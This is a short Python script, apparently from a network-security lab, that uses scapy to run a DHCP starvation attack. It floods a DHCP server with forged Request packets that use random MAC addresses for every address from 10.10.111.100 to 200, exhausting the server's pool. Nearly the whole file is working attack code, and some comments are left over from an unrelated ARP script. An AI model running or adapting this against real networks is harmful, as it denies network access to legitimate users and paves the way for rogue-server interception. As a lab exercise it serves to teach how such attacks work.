#!/usr/bin/python
"""
  DHCP starvation attack
  
  This is a hardcoded solution because we know the IP range of the DHCP server
  A normal DHCP transaction is with 
    DHCP Discover
    DHCP Offer
    DHCP Request
    DHCP Ack
  As we've already known the offered IP range, we simply ignore the first 2 steps
  and directly send DHCP Request to the DHCP server
  The server will reply with DHCP Ack and allocate the IP address
"""

import sys
import time
from scapy.all import *

for i in range(100,201):

  # make the IP address
  ipaddr = '10.10.111.' + str(i)
  print ipaddr

  # make the ARP gratuitous packets
  dhcp_request = Ether(src=RandMAC(), dst='ff:ff:ff:ff:ff:ff')/\
                    IP(src='0.0.0.0', dst='255.255.255.255')/\
                    UDP(sport=68, dport=67)/\
                    BOOTP(chaddr=RandString(12, '0123456789abcdef'))/\
                    DHCP(options=[('message-type','request'),\
                                  ('requested_addr', ipaddr),\
                                   'end'])

  # send the two packets for gateway and victim machines
  sendp(dhcp_request, iface='eth0', count=3)

  # sleep 0.5 sec for each IP address
  time.sleep(0.5)

